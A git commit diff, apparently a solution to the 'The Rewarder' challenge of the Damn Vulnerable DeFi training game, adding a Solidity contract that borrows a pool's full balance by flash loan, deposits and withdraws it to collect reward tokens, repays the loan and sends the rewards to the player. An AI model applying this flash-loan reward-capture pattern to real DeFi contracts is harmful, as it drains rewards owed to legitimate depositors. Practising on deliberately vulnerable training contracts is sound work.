38ec3f3b7002d4808d46d46828cf2fe438bb754a
Sergi Roca Laguna <sergiroca@163.com>
2024-08-24 21:27:44 +0200

    solve the rewarder

--- damnVulnerableDefi/contracts/the-rewarder/FlashLoanerPool.sol
+++ damnVulnerableDefi/contracts/the-rewarder/FlashLoanerPool.sol
@@ -5,6 +5,7 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "../DamnValuableToken.sol";
+import "./TheRewarderPool.sol";
 
 /**
  * @title FlashLoanerPool
@@ -37,10 +38,56 @@ contract FlashLoanerPool is ReentrancyGuard {
 
         liquidityToken.transfer(msg.sender, amount);
 
-        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));
+        msg.sender.functionCall(
+            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
+        );
 
         if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
             revert FlashLoanNotPaidBack();
         }
+    }
+}
+
+contract FlashLoanerReceiver {
+    DamnValuableToken public immutable i_liquidityToken;
+    FlashLoanerPool public immutable i_flashLoanerPool;
+    TheRewarderPool public immutable i_rewarderPool;
+    RewardToken public immutable i_rewardToken;
+    address public immutable i_player;
+
+    constructor(
+        address _liquidityTokenAddress,
+        FlashLoanerPool _flashLoanerPool,
+        TheRewarderPool _rewarderPool,
+        RewardToken _rewardToken,
+        address _player
+    ) {
+        i_liquidityToken = DamnValuableToken(_liquidityTokenAddress);
+        i_flashLoanerPool = _flashLoanerPool;
+        i_rewarderPool = _rewarderPool;
+        i_rewardToken = _rewardToken;
+        i_player = _player;
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        i_flashLoanerPool.flashLoan(
+            i_liquidityToken.balanceOf(address(i_flashLoanerPool))
+        );
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        _approveDepositWithdraw(amount);
+
+        i_liquidityToken.transfer(address(i_flashLoanerPool), amount);
+        i_rewardToken.transfer(
+            i_player,
+            i_rewardToken.balanceOf(address(this))
+        );
+    }
+
+    function _approveDepositWithdraw(uint256 amount) internal {
+        i_liquidityToken.approve(address(i_rewarderPool), amount);
+        i_rewarderPool.deposit(amount);
+        i_rewarderPool.withdraw(amount);
     }
 }
